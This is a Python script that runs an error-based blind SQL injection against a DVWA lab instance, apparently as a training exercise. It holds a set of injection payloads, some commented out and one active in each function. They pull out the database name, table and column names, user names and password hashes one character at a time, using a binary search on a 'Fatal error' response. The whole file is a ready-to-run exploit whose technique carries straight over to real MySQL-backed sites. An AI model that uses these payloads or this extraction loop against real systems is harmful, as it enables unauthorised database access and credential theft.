import math
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = "http://192.168.131.135/dvwa/vulnerabilities/sqli_blind/?id="

cookies = {"PHPSESSID": "rdkpnlqrrt27bg3hmsisj77gk9", "security": "low"}

def req(row, num, oper, pas):
    # payload = "' or (select if((ascii(substring(database(), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (num, oper, pas)
    # payload = "' or (select if((ascii(substring((select table_name from information_schema.tables where table_schema=database() limit %s,1), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (row, num, oper, pas)
    # payload = "' or (select if((ascii(substring((select column_name from information_schema.columns where table_name='users' limit %s,1), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (row, num, oper, pas)
    # payload = "' or (select if((ascii(substring((select user from users limit %s,1), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (row, num, oper, pas)
    payload = "' or (select if((ascii(substring((select password from users limit %s,1), %s, 1)) %s %s),(select table_name from information_schema.tables),'a')) = 'a'-- " % (row, num, oper, pas)
    payload_encoded = urllib.parse.quote(payload)
    inject = url + payload_encoded + "&Submit=Submit"
    return requests.get(url=inject, cookies=cookies, proxies=proxies, verify = False) 

def detect_length(num):
    for len in range(1, 50):
        # payload = "' or (select if((length(database()) = %s),(select table_name from information_schema.tables),1)) = 1-- " % (len)
        # payload = "' or (select if(((select count(*) from information_schema.tables where table_schema=database()) = %s),(select table_name from information_schema.tables),1)) = 1-- " % (len)
        # payload = "' or (select if((char_length(cast((select table_name from information_schema.tables where table_schema=database() limit %s,1) as nchar)) = %s),(select table_name from information_schema.tables),1)) = 1-- " % (num, len)
        # payload = "' or (select if(((select count(*) from information_schema.columns where table_name=\"users\") = %s),(select table_name from information_schema.tables),1)) = 1-- " % (len)
        # payload = "' or (select if((char_length(cast((select column_name from information_schema.columns where table_name=\"users\" limit %s,1) as nchar)) = %s),(select table_name from information_schema.tables),1)) = 1-- " % (num, len)
        # payload = "' or (select if(((select count(*) from users) = %s),(select table_name from information_schema.tables),1)) = 1-- " % (len)
        # payload = "' or (select if((char_length(cast((select user from users limit %s,1) as nchar)) = %s),(select table_name from information_schema.tables),1)) = 1-- " % (num, len)
        payload = "' or (select if((char_length(cast((select password from users limit %s,1) as nchar)) = %s),(select table_name from information_schema.tables),1)) = 1-- " % (num, len)
        payload_encoded = urllib.parse.quote(payload)
        inject = url + payload_encoded + "&Submit=Submit"
        r = requests.get(url=inject, proxies=proxies, cookies=cookies, verify=False)
        if "Fatal error" in r.text:
            sys.stdout.write("\r")
            print(f"length: {len}")
            break
        else:
            sys.stdout.write("\r" + str(len))
            sys.stdout.flush

def sqli(length, row):
    data = ""
    for i in range(1,length+1):
        first = 32
        last = 126
        while first <= last:
            middle = math.floor(first + (last-first)/2)
            if "Fatal error" in req(row, i, '=', middle).text:
                data += chr(middle)
                sys.stdout.write("\r" + data)
                sys.stdout.flush
                break
            elif "Fatal error" in req(row, i, '>', middle).text:
                sys.stdout.write("\r" + data + chr(middle))
                sys.stdout.flush
                first = middle + 1
            else:
                sys.stdout.write("\r" + data + chr(middle))
                sys.stdout.flush
                last = middle - 1
    print()
                
def loop_dl(num):
    for i in range(1, num+1):
        detect_length(i-1)
        
def loop_sqli(num, length):
    for i in range(1, num+1):
        sqli(length[i-1], i-1)

def main():
    function = int(input("function: "))
    amount = int(input("amount: "))
    length = []
    if function == 1:
        i = 0
        while (True):
            l = ""
            l = input(f"length{i+1}: ")
            if len(l) != 0:
                length.append(int(l))
                i+=1
            if i == amount: 
                break
        loop_sqli(amount, length)
    else:
        loop_dl(amount)

if __name__ == "__main__":
    main()